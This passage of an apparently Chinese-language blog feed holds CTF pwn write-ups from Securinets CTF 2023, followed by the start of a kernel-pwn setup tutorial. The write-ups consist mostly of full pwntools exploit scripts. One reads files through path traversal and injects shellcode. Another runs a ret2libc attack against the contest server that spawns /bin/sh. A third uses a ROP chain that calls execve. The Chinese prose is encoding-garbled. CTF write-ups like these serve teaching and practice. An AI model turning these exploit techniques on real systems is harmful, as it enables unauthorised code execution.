class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setcfg</span>(<span class="params">idx, v</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Choice:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Config index:&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.send(v)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readchat</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Choice:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Chat ID:\n&quot;</span>, name)</span><br><span class="line">dbpie(<span class="string">&#x27;0x016D6&#x27;</span>)</span><br><span class="line">readchat(<span class="string">b&#x27;../../../../../../../../../proc/self/maps&#x27;</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;55cc2374d000&#x27;</span>)),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">backupCode=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;7fa5dd3e7000&#x27;</span>)),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">p(<span class="string">&#x27;backupCode&#x27;</span>,backupCode)</span><br><span class="line">config=<span class="number">0x4060</span>+pie</span><br><span class="line">setcfg((<span class="number">0x4070</span>-<span class="number">0x4060</span>)//<span class="number">8</span>,p64(<span class="number">0x20C2</span>+pie))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">buffer=elf.bss()+pie+<span class="number">0x100</span></span><br><span class="line">pld = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)+shellcraft.read(<span class="number">3</span>,buffer, <span class="number">0x50</span>) + shellcraft.write(<span class="number">1</span>,buffer,<span class="number">0x50</span>)) </span><br><span class="line"><span class="built_in">print</span>(pld)</span><br><span class="line">setcfg((<span class="number">0x40A8</span>-<span class="number">0x4060</span>)//<span class="number">8</span>,p64(backupCode))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pld), <span class="number">8</span>):</span><br><span class="line">    setcfg((backupCode-(<span class="number">0x4060</span>+pie))//<span class="number">8</span>+i//<span class="number">8</span>, pld[i:i+<span class="number">8</span>])</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">sla(<span class="string">b&quot;Choice:&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023-securinets-ctf/image-20230813211518532.png" alt="image-20230813211518532"></p><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/S/r/togive&gt; checksec main</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/Securinetsctf/ret2libc/togive/main&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8047000)</span><br><span class="line">    RUNPATH:  b&#x27;./&#x27;</span><br></pre></td></tr></table></figure><p>æ ˆæº¢å‡ºï¼Œä½†æ˜¯é€šè¿‡ecxå¯„å­˜å™¨æŠŠåŸæ¥çš„espä¿å­˜åˆ°æ ˆä¸Šï¼Œå†å¸¸è§„æå‡å †æ ˆï¼Œå¯¼è‡´retå’Œebpç›´æ¥æœ‰ä¸€æ®µè·ç¦»ï¼Œæ‰¾åˆ°retéœ€è¦æ ˆä¸Šä¹‹å‰ä¿å­˜çš„espå€¼ï¼Œæ‰€ä»¥ä¸èƒ½è¦†ç›–ret</p><p>å¯ä»¥åˆ©ç”¨getsæŠŠâ€˜\nâ€™æˆªæ–­ä¸º\x00è¦†ç›–å­˜æ”¾åœ¨æ ˆä¸Šçš„espçš„ä½ä½ä¸º00ï¼Œæœ‰å¾ˆå¤§æœºç‡å°†espæå‡åˆ°æˆ‘ä»¬getsè¾“å…¥çš„æ ˆç©ºé—´ï¼Œpayloadå‰é¢ç”¨retå¡«å……åé¢å†™topé“¾å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">080491</span>D3 <span class="number">8</span>D <span class="number">4</span>C <span class="number">24</span> <span class="number">04</span>                   lea     ecx, [esp+<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080491</span>D7 <span class="number">83</span> E4 F0                      and     esp, <span class="number">0F</span>FFFFFF0h</span><br><span class="line">.text:<span class="number">080491</span>DA FF <span class="number">71</span> FC                      push    dword ptr [ecx<span class="number">-4</span>]</span><br><span class="line">.text:<span class="number">080491</span>DD <span class="number">55</span>                            push    ebp</span><br><span class="line">.text:<span class="number">080491</span>DE <span class="number">89</span> E5                         mov     ebp, esp</span><br><span class="line">.text:<span class="number">080491E0</span> <span class="number">53</span>                            push    ebx</span><br><span class="line">.text:<span class="number">080491E1</span> <span class="number">51</span>                            push    ecx</span><br><span class="line">.text:<span class="number">080491E2</span> <span class="number">83</span> EC <span class="number">50</span>                      sub     esp, <span class="number">50</span>h</span><br><span class="line">.text:<span class="number">080491E5</span> E8 C6 FE FF FF                call    __x86_get_pc_thunk_bx</span><br><span class="line">.text:<span class="number">080491E5</span></span><br><span class="line">.text:<span class="number">080491</span>EA <span class="number">81</span> C3 <span class="number">0</span>A <span class="number">2</span>E <span class="number">00</span> <span class="number">00</span>             add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:<span class="number">080491F</span>0 E8 <span class="number">81</span> FF FF FF                call    setup</span><br><span class="line">.text:<span class="number">080491F</span>0</span><br><span class="line">.text:<span class="number">080491F</span>5 <span class="number">83</span> EC <span class="number">0</span>C                      sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">080491F</span>8 <span class="number">8</span>D <span class="number">83</span> <span class="number">14</span> E0 FF FF             lea     eax, (aIsThisSolveabl - <span class="number">804B</span>FF4h)[ebx] ; <span class="string">&quot;Is this solveable?&quot;</span></span><br><span class="line">.text:<span class="number">080491F</span>E <span class="number">50</span>                            push    eax                             ; s</span><br><span class="line">.text:<span class="number">080491F</span>F E8 <span class="number">4</span>C FE FF FF                call    _puts</span><br><span class="line">.text:<span class="number">080491F</span>F</span><br><span class="line">.text:<span class="number">08049204</span> <span class="number">83</span> C4 <span class="number">10</span>                      add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08049207</span> <span class="number">83</span> EC <span class="number">0</span>C                      sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0804920</span>A <span class="number">8</span>D <span class="number">45</span> A8                      lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">0804920</span>D <span class="number">50</span>                            push    eax                             ; s</span><br><span class="line">.text:<span class="number">0804920</span>E E8 <span class="number">2</span>D FE FF FF                call    _gets</span><br><span class="line">.text:<span class="number">0804920</span>E</span><br><span class="line">.text:<span class="number">08049213</span> <span class="number">83</span> C4 <span class="number">10</span>                      add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08049216</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0804921B</span> <span class="number">8</span>D <span class="number">65</span> F8                      lea     esp, [ebp<span class="number">-8</span>]</span><br><span class="line">.text:<span class="number">0804921</span>E <span class="number">59</span>                            pop     ecx</span><br><span class="line">.text:<span class="number">0804921F</span> <span class="number">5B</span>                            pop     ebx</span><br><span class="line">.text:<span class="number">08049220</span> <span class="number">5</span>D                            pop     ebp</span><br><span class="line">.text:<span class="number">08049221</span> <span class="number">8</span>D <span class="number">61</span> FC                      lea     esp, [ecx<span class="number">-4</span>]</span><br><span class="line">.text:<span class="number">08049224</span> C3                            retn</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io=remote(<span class="string">&#x27;pwn.ctf.securinets.tn&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line">        <span class="comment"># io=process(pwnfile)</span></span><br><span class="line">        ret=<span class="number">0x804923B</span></span><br><span class="line">        padding=p32(ret)*((<span class="number">0x50</span>-<span class="number">12</span>)//<span class="number">4</span>)</span><br><span class="line">        payload=flat(padding,</span><br><span class="line">                    elf.plt[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">                    elf.sym[<span class="string">&#x27;main&#x27;</span>],</span><br><span class="line">                    elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">                    )</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;solveable?&#x27;</span>,payload)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        puts_ad=io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>,drop=<span class="literal">False</span>,timeout=<span class="number">4</span>)</span><br><span class="line">        puts_ad=uu32(puts_ad)</span><br><span class="line">        <span class="keyword">if</span>(puts_ad!=<span class="number">0</span>):</span><br><span class="line">          <span class="comment"># gdb.attach(io,&#x27;b *0x8049216&#x27;)</span></span><br><span class="line">          libcbase=puts_ad-libcelf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">          system_ad=libcbase+libcelf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">          binsh=libcbase+<span class="built_in">next</span>(libcelf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">          payload=flat(padding,</span><br><span class="line">                    system_ad,</span><br><span class="line">                    elf.sym[<span class="string">&#x27;main&#x27;</span>],</span><br><span class="line">                    binsh</span><br><span class="line">                    )</span><br><span class="line">          io.sendlineafter(<span class="string">b&#x27;solveable?&#x27;</span>,payload)</span><br><span class="line">          io.interactive()</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023-securinets-ctf/image-20230810183252407.png" alt="image-20230810183252407"></p><h2 id="One-is-enough"><a href="#One-is-enough" class="headerlink" title="One is enough"></a>One is enough</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/mnt/hgfs/share/match/Securinetsctf/One is enough/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>readInputé‡Œæœ‰ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œæ‰€ä»¥åœ¨ä¸¤ä¸ªåŠŸèƒ½å‡½æ•°éƒ½èƒ½ä¿®æ”¹ä¿å­˜åˆ°æ ˆä¸Šçš„mainå‡½æ•°çš„rbpï¼Œé™æ€ç¼–è¯‘çš„ç¨‹åºé‡Œé¢æœ‰syscallçš„gadgetï¼Œæ‰€ä»¥å°±å¯ä»¥æ§åˆ¶rbpåœ¨mainè¿”å›æ—¶åˆ©ç”¨rop</p><p>æ–­ç‚¹ä¸‹åˆ° readDescriptionçš„memMoveï¼Œåªè¦mainçš„rbpå’Œè¯»å…¥æ•°æ®çš„æ ˆåœ°å€åªæœ‰æœ€åä¸€ä½ä¸åŒå°±è¡Œï¼Œå¤§æ¦‚ä¹Ÿå°±16ç§å¯èƒ½ï¼Œæ€»æœ‰æœºä¼šä¼šçˆ†ç ´åˆ°</p><p><img src="/2023/08/10/2023-securinets-ctf/image-20230810223319615.png" alt="image-20230810223319615"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment"># io = process(pwnfile)</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># db(&#x27;0x401866&#x27;)</span></span><br><span class="line">    <span class="comment"># db(&#x27;0x040186B&#x27;)</span></span><br><span class="line">    pop_rax=<span class="number">0x0000000000431c77</span></span><br><span class="line">    pop_rsi=<span class="number">0x000000000040ab23</span></span><br><span class="line">    pop_rdi=<span class="number">0x0000000000401f3d</span></span><br><span class="line">    pop_rdx_rbx=<span class="number">0x0000000000463367</span></span><br><span class="line">    syscall=<span class="number">0x00000000004121e2</span></span><br><span class="line">    padding=cyclic(<span class="number">0x100</span>-<span class="number">0xf0</span>)</span><br><span class="line">    payload=flat(<span class="number">0xdeadbeef</span>,</span><br><span class="line">                pop_rdi,<span class="number">0</span>,pop_rsi,elf.bss()+<span class="number">0x100</span>,pop_rdx_rbx,<span class="number">59</span>,<span class="number">0</span>,elf.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">                pop_rdi,elf.bss()+<span class="number">0x100</span>,pop_rsi,<span class="number">0</span>,pop_rdx_rbx,<span class="number">0</span>,<span class="number">0</span>,syscall)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sla(<span class="string">b&#x27;Quit\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;tion:&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;Quit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    payload=cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;\x30&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;rname:&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;Quit\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023-securinets-ctf/image-20230810222406110.png" alt="image-20230810222406110"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Pwn åŸºç¡€</title>
      <link href="/2023/08/08/first-kernelpwn/"/>
      <url>/2023/08/08/first-kernelpwn/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ä»¥<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar">CISCN2017-babydriver</a>ä¸ºä¾‹</p><h3 id="busyboxæ–‡ä»¶ç³»ç»Ÿ"><a href="#busyboxæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="busyboxæ–‡ä»¶ç³»ç»Ÿ"></a><a href="https://zh.wikipedia.org/wiki/BusyBox">busyboxæ–‡ä»¶ç³»ç»Ÿ</a></h3><p>ç®€å•çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæä¾›åŸºæœ¬ç”¨æˆ·ç¯å¢ƒï¼Œå¦‚ä¸€äº›å¸¸ç”¨å‘½ä»¤å’Œå·¥å…·</p><p><a href="https://www.busybox.net/">https://www.busybox.net/</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>å°†busyboxç¼–è¯‘ä¸ºé™æ€é“¾æ¥çš„æ–‡ä»¶</p><p><img src="/2023/08/08/first-kernelpwn/image-20230808234139406.png" alt="image-20230808234139406"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">make -j6</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å…¶ä»–æ¶æ„busybox</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make -j4 CROSS_COMPILE = å…¶ä»–æ¶æ„äº¤å‰ç¼–è¯‘å™¨</span><br></pre></td></tr></table></figure><p>åœ¨ç¼–è¯‘å¥½çš„æ–‡ä»¶å¤¹ä¸‹(é»˜è®¤ä¸º_install)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure><p>å†™ä¸‹init è„šæœ¬ chmod +x init </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc    </span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">insmod /babydriver.ko</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><p>æ‰“åŒ…è„šæœ¬</p><p>pack.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">sudo cp -r rootfs rootfs_tmp</span><br><span class="line">sudo cp init rootfs_tmp/</span><br><span class="line">sudo cp babydriver.ko rootfs_tmp/</span><br><span class="line"></span><br><span class="line">sudo chmod +x rootfs_tmp/</span><br><span class="line">sudo chmod g-w -R rootfs_tmp/</span><br><span class="line">sudo chmod o-w -R rootfs_tmp/</span><br><span class="line">sudo chown -R root rootfs_tmp/</span><br><span class="line">sudo chgrp -R root rootfs_tmp/</span><br><span class="line">sudo chmod u+s rootfs_tmp/bin/busybox</span><br><span class="line"></span><br><span class="line">cd rootfs_tmp</span><br><span class="line">sudo mkdir -p  proc sys dev etc/init.d</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line">cd ../</span><br><span class="line">sudo rm -rf ./rootfs_tmp</span><br></pre></td></tr></table></figure><p>è§£åŒ…</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.img</span><br></pre></td></tr></table></figure><h3 id="å†…æ ¸"><a href="#å†…æ ¸" class="headerlink" title="å†…æ ¸"></a>å†…æ ¸</h3><h4 id="è‡ªå·±ç¼–è¯‘å†…æ ¸"><a href="#è‡ªå·±ç¼–è¯‘å†…æ ¸" class="headerlink" title="è‡ªå·±ç¼–è¯‘å†…æ ¸"></a>è‡ªå·±ç¼–è¯‘å†…æ ¸</h4><p><a href="https://www.kernel.org/">https://www.kernel.org/</a></p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">https://mirrors.tuna.tsinghua.edu.cn/kernel/</a></p><p><a href="https://cdn.kernel.org/pub/linux/kernel/">https://cdn.kernel.org/pub/linux/kernel/</a></p><p><a href="https://blog.csdn.net/SweeNeil/article/details/88655995">ä¸è¦åœ¨å…±äº«ç›®å½•ä¸‹æ¥è§£å‹kernelï¼Œä¸ç„¶ä¼šæœ‰äº›ç¬¦å·é“¾æ¥çš„é—®é¢˜</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make help</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make -j4 bzImage</span><br></pre></td></tr></table></figure><p>è·¨å¹³å°</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ARCH=å¹³å° CROSS_COMPILE= å…¶ä»–æ¶æ„äº¤å‰ç¼–è¯‘å™¨ make -j4 bzImage</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æŒ‰ç…§é¢˜ç›®ç»™çš„å†…æ ¸æ–‡ä»¶bzImageç¼–è¯‘æŒ‡å®šç‰ˆæœ¬å†…æ ¸</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/kernel-env&gt; file ./bzImage</span><br><span class="line">./bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0X6, Normal VGA</span><br></pre></td></tr></table></figure><p><a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.72.tar.gz">https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.72.tar.gz</a></p><p>ç¡®å®šä¸€ä¸‹gccç‰ˆæœ¬,é˜²æ­¢ä¸€äº›ä¸å¿…è¦çš„é—®é¢˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/kernel-env&gt; strings ./bzImage | grep &#x27;gcc&#x27;</span><br><span class="line">4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP Thu Jun 15 19:52:50 PDT 2017</span><br></pre></td></tr></table></figure><p>è‡ªå·±ç¼–è¯‘æ—¶é‡åˆ°çš„é—®é¢˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/k/linux-4.4.42&gt; make menuconfig</span><br><span class="line">  HOSTCC  scripts/kconfig/mconf.o</span><br><span class="line">In file included from scripts/kconfig/mconf.c:23:0:</span><br><span class="line">scripts/kconfig/lxdialog/dialog.h:38:20: fatal error: curses.h: No such file or directory</span><br><span class="line">compilation terminated.</span><br><span class="line">scripts/Makefile.host:108: recipe for target &#x27;scripts/kconfig/mconf.o&#x27; failed</span><br><span class="line">make[1]: *** [scripts/kconfig/mconf.o] Error 1</span><br><span class="line">Makefile:542: recipe for target &#x27;menuconfig&#x27; failed</span><br><span class="line">make: *** [menuconfig] Error 2</span><br><span class="line">è§£å†³</span><br><span class="line">sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scripts/sign-file.c:23:30: fatal error: openssl/opensslv.h: No such file or directory</span><br><span class="line">compilation terminated.</span><br><span class="line">scripts/Makefile.host:91: recipe for target &#x27;scripts/sign-file&#x27; failed</span><br><span class="line">make[1]: *** [scripts/sign-file] Error 1</span><br><span class="line">make[1]: *** Waiting for unfinished jobs....</span><br><span class="line">  HOSTCC  arch/x86/tools/relocs_common.o</span><br><span class="line">  HOSTLD  arch/x86/tools/relocs</span><br><span class="line">Makefile:556: recipe for target &#x27;scripts&#x27; failed</span><br><span class="line">make: *** [scripts] Error 2</span><br><span class="line">make: *** Waiting for unfinished jobs....</span><br><span class="line">è§£å†³</span><br><span class="line">grxer@Ubuntu16 /m/h/s/k/linux-4.4.42&gt;  sudo apt-get install libssl-dev </span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Setup is 17404 bytes (padded to 17408 bytes).</span><br><span class="line">System is 6820 kB</span><br><span class="line">CRC df8a19f</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„æ–‡ä»¶å°±æ˜¯</p><ul><li>bzImageï¼š<code>arch/x86/boot/bzImage</code></li><li>vmlinuxï¼šç”¨æ¥è°ƒè¯•</li></ul><p>å†…æ ¸é•œåƒè¯¦ç»†ä»‹ç»: <a href="https://gohalo.me/post/kernel-compile.html">https://gohalo.me/post/kernel-compile.html</a></p><h4 id="ä¸‹è½½ç°æœ‰å†…æ ¸é•œåƒ"><a href="#ä¸‹è½½ç°æœ‰å†…æ ¸é•œåƒ" class="headerlink" title="ä¸‹è½½ç°æœ‰å†…æ 